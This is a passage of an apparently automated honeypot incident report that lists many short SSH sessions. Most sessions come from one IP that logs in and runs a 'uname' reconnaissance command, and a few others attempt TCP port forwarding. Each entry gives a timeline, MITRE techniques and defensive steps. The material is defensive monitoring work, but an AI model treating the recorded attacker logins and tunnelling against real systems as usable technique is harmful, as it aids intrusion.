- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24dbcee38a5

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:36` | `cowrie.session.connect` |
| `2026-07-06 09:27:36` | `cowrie.client.version` |
| `2026-07-06 09:27:36` | `cowrie.client.kex` |
| `2026-07-06 09:27:37` | `cowrie.login.success` |
| `2026-07-06 09:27:38` | `cowrie.session.params` |
| `2026-07-06 09:27:38` | `cowrie.command.input` |
| `2026-07-06 09:27:38` | `cowrie.log.closed` |
| `2026-07-06 09:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c419703a360b

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:37` | `cowrie.session.connect` |
| `2026-07-06 09:27:37` | `cowrie.client.version` |
| `2026-07-06 09:27:37` | `cowrie.client.kex` |
| `2026-07-06 09:27:38` | `cowrie.login.success` |
| `2026-07-06 09:27:39` | `cowrie.session.params` |
| `2026-07-06 09:27:39` | `cowrie.command.input` |
| `2026-07-06 09:27:39` | `cowrie.log.closed` |
| `2026-07-06 09:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7090f3eca58c

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:38` | `cowrie.session.connect` |
| `2026-07-06 09:27:38` | `cowrie.client.version` |
| `2026-07-06 09:27:39` | `cowrie.client.kex` |
| `2026-07-06 09:27:40` | `cowrie.login.success` |
| `2026-07-06 09:27:41` | `cowrie.session.params` |
| `2026-07-06 09:27:41` | `cowrie.command.input` |
| `2026-07-06 09:27:42` | `cowrie.log.closed` |
| `2026-07-06 09:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f786edd669ee

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:39` | `cowrie.session.connect` |
| `2026-07-06 09:27:39` | `cowrie.client.version` |
| `2026-07-06 09:27:39` | `cowrie.client.kex` |
| `2026-07-06 09:27:40` | `cowrie.login.success` |
| `2026-07-06 09:27:42` | `cowrie.session.params` |
| `2026-07-06 09:27:42` | `cowrie.command.input` |
| `2026-07-06 09:27:42` | `cowrie.log.closed` |
| `2026-07-06 09:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d1f4abe26c0

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:42` | `cowrie.session.connect` |
| `2026-07-06 09:27:42` | `cowrie.client.version` |
| `2026-07-06 09:27:42` | `cowrie.client.kex` |
| `2026-07-06 09:27:43` | `cowrie.login.success` |
| `2026-07-06 09:27:44` | `cowrie.session.params` |
| `2026-07-06 09:27:44` | `cowrie.command.input` |
| `2026-07-06 09:27:44` | `cowrie.log.closed` |
| `2026-07-06 09:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039ba7d04cb0

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:42` | `cowrie.session.connect` |
| `2026-07-06 09:27:42` | `cowrie.client.version` |
| `2026-07-06 09:27:43` | `cowrie.client.kex` |
| `2026-07-06 09:27:44` | `cowrie.login.success` |
| `2026-07-06 09:27:46` | `cowrie.session.params` |
| `2026-07-06 09:27:46` | `cowrie.command.input` |
| `2026-07-06 09:27:46` | `cowrie.log.closed` |
| `2026-07-06 09:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb60c6a4008

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:46` | `cowrie.session.connect` |
| `2026-07-06 09:27:46` | `cowrie.client.version` |
| `2026-07-06 09:27:46` | `cowrie.client.kex` |
| `2026-07-06 09:27:47` | `cowrie.login.success` |
| `2026-07-06 09:27:47` | `cowrie.session.params` |
| `2026-07-06 09:27:47` | `cowrie.command.input` |
| `2026-07-06 09:27:48` | `cowrie.log.closed` |
| `2026-07-06 09:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3de791c85026

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:46` | `cowrie.session.connect` |
| `2026-07-06 09:27:46` | `cowrie.client.version` |
| `2026-07-06 09:27:46` | `cowrie.client.kex` |
| `2026-07-06 09:27:47` | `cowrie.login.success` |
| `2026-07-06 09:27:48` | `cowrie.session.params` |
| `2026-07-06 09:27:48` | `cowrie.command.input` |
| `2026-07-06 09:27:48` | `cowrie.log.closed` |
| `2026-07-06 09:27:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549e5b834a14

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:47` | `cowrie.session.connect` |
| `2026-07-06 09:27:47` | `cowrie.client.version` |
| `2026-07-06 09:27:47` | `cowrie.client.kex` |
| `2026-07-06 09:27:48` | `cowrie.login.success` |
| `2026-07-06 09:27:49` | `cowrie.session.params` |
| `2026-07-06 09:27:49` | `cowrie.command.input` |
| `2026-07-06 09:27:50` | `cowrie.log.closed` |
| `2026-07-06 09:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6c519d9005

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:48` | `cowrie.session.connect` |
| `2026-07-06 09:27:48` | `cowrie.client.version` |
| `2026-07-06 09:27:48` | `cowrie.client.kex` |
| `2026-07-06 09:27:50` | `cowrie.login.success` |
| `2026-07-06 09:27:51` | `cowrie.session.params` |
| `2026-07-06 09:27:51` | `cowrie.command.input` |
| `2026-07-06 09:27:52` | `cowrie.log.closed` |
| `2026-07-06 09:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b7f0b79480

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:49` | `cowrie.session.connect` |
| `2026-07-06 09:27:49` | `cowrie.client.version` |
| `2026-07-06 09:27:50` | `cowrie.client.kex` |
| `2026-07-06 09:27:50` | `cowrie.login.success` |
| `2026-07-06 09:27:52` | `cowrie.session.params` |
| `2026-07-06 09:27:52` | `cowrie.command.input` |
| `2026-07-06 09:27:52` | `cowrie.log.closed` |
| `2026-07-06 09:27:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891f13cb794b

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:51` | `cowrie.session.connect` |
| `2026-07-06 09:27:51` | `cowrie.client.version` |
| `2026-07-06 09:27:52` | `cowrie.client.kex` |
| `2026-07-06 09:27:53` | `cowrie.login.success` |
| `2026-07-06 09:27:53` | `cowrie.session.params` |
| `2026-07-06 09:27:53` | `cowrie.command.input` |
| `2026-07-06 09:27:54` | `cowrie.log.closed` |
| `2026-07-06 09:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4afbd8f75b4

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:55` | `cowrie.session.connect` |
| `2026-07-06 09:27:55` | `cowrie.client.version` |
| `2026-07-06 09:27:55` | `cowrie.client.kex` |
| `2026-07-06 09:27:56` | `cowrie.login.success` |
| `2026-07-06 09:27:57` | `cowrie.session.params` |
| `2026-07-06 09:27:57` | `cowrie.command.input` |
| `2026-07-06 09:27:57` | `cowrie.log.closed` |
| `2026-07-06 09:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c295cbe98db7

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:57` | `cowrie.session.connect` |
| `2026-07-06 09:27:57` | `cowrie.client.version` |
| `2026-07-06 09:27:57` | `cowrie.client.kex` |
| `2026-07-06 09:27:58` | `cowrie.login.success` |
| `2026-07-06 09:27:59` | `cowrie.session.params` |
| `2026-07-06 09:27:59` | `cowrie.command.input` |
| `2026-07-06 09:27:59` | `cowrie.log.closed` |
| `2026-07-06 09:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15eaa9912e03

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:57` | `cowrie.session.connect` |
| `2026-07-06 09:27:57` | `cowrie.client.version` |
| `2026-07-06 09:27:57` | `cowrie.client.kex` |
| `2026-07-06 09:27:57` | `cowrie.login.success` |
| `2026-07-06 09:27:57` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:27:58` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 09:27:58` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6b02188497

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:00` | `cowrie.session.connect` |
| `2026-07-06 09:28:00` | `cowrie.client.version` |
| `2026-07-06 09:28:00` | `cowrie.client.kex` |
| `2026-07-06 09:28:01` | `cowrie.login.success` |
| `2026-07-06 09:28:02` | `cowrie.session.params` |
| `2026-07-06 09:28:02` | `cowrie.command.input` |
| `2026-07-06 09:28:02` | `cowrie.log.closed` |
| `2026-07-06 09:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95f42120c6ca

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:01` | `cowrie.session.connect` |
| `2026-07-06 09:28:01` | `cowrie.client.version` |
| `2026-07-06 09:28:01` | `cowrie.client.kex` |
| `2026-07-06 09:28:02` | `cowrie.login.success` |
| `2026-07-06 09:28:03` | `cowrie.session.params` |
| `2026-07-06 09:28:03` | `cowrie.command.input` |
| `2026-07-06 09:28:04` | `cowrie.log.closed` |
| `2026-07-06 09:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-531956d8c945

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:02` | `cowrie.session.connect` |
| `2026-07-06 09:28:02` | `cowrie.client.version` |
| `2026-07-06 09:28:02` | `cowrie.client.kex` |
| `2026-07-06 09:28:04` | `cowrie.login.success` |
| `2026-07-06 09:28:04` | `cowrie.session.params` |
| `2026-07-06 09:28:04` | `cowrie.command.input` |
| `2026-07-06 09:28:05` | `cowrie.log.closed` |
| `2026-07-06 09:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1dc238bf52

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:03` | `cowrie.session.connect` |
| `2026-07-06 09:28:03` | `cowrie.client.version` |
| `2026-07-06 09:28:04` | `cowrie.client.kex` |
| `2026-07-06 09:28:04` | `cowrie.login.success` |
| `2026-07-06 09:28:06` | `cowrie.session.params` |
| `2026-07-06 09:28:06` | `cowrie.command.input` |
| `2026-07-06 09:28:06` | `cowrie.log.closed` |
| `2026-07-06 09:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110703d0a34a

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:04` | `cowrie.session.connect` |
| `2026-07-06 09:28:04` | `cowrie.client.version` |
| `2026-07-06 09:28:05` | `cowrie.client.kex` |
| `2026-07-06 09:28:06` | `cowrie.login.success` |
| `2026-07-06 09:28:07` | `cowrie.session.params` |
| `2026-07-06 09:28:07` | `cowrie.command.input` |
| `2026-07-06 09:28:07` | `cowrie.log.closed` |
| `2026-07-06 09:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4364f43dbbc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:05` | `cowrie.session.connect` |
| `2026-07-06 09:28:05` | `cowrie.client.version` |
| `2026-07-06 09:28:06` | `cowrie.client.kex` |
| `2026-07-06 09:28:06` | `cowrie.login.success` |
| `2026-07-06 09:28:06` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:28:06` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b44d7e00641

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:06` | `cowrie.session.connect` |
| `2026-07-06 09:28:06` | `cowrie.client.version` |
| `2026-07-06 09:28:06` | `cowrie.client.kex` |
| `2026-07-06 09:28:07` | `cowrie.login.success` |
| `2026-07-06 09:28:08` | `cowrie.session.params` |
| `2026-07-06 09:28:08` | `cowrie.command.input` |
| `2026-07-06 09:28:09` | `cowrie.log.closed` |
| `2026-07-06 09:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba22de520cd6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:09` | `cowrie.session.connect` |
| `2026-07-06 09:28:09` | `cowrie.client.version` |
| `2026-07-06 09:28:09` | `cowrie.client.kex` |
| `2026-07-06 09:28:10` | `cowrie.login.success` |
| `2026-07-06 09:28:11` | `cowrie.session.params` |
| `2026-07-06 09:28:11` | `cowrie.command.input` |
| `2026-07-06 09:28:11` | `cowrie.log.closed` |
| `2026-07-06 09:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff787ea0ca1f

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:11` | `cowrie.session.connect` |
| `2026-07-06 09:28:11` | `cowrie.client.version` |
| `2026-07-06 09:28:11` | `cowrie.client.kex` |
| `2026-07-06 09:28:12` | `cowrie.login.success` |
| `2026-07-06 09:28:13` | `cowrie.session.params` |
| `2026-07-06 09:28:13` | `cowrie.command.input` |
| `2026-07-06 09:28:13` | `cowrie.log.closed` |
| `2026-07-06 09:28:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce22b9e9a49

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:28:13` | `cowrie.session.connect` |
| `2026-07-06 09:28:13` | `cowrie.client.version` |
| `2026-07-06 09:28:13` | `cowrie.client.kex` |
| `2026-07-06 09:28:14` | `cowrie.login.success` |
| `2026-07-06 09:28:15` | `cowrie.session.params` |
| `2026-07-06 09:28:15` | `cowrie.command.input` |
| `2026-07-06 09:28:15` | `cowrie.log.closed` |
| `2026-07-06 09:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2aab907a8c3

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:28 |
| **Last Seen** | 2026-07-06 09:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
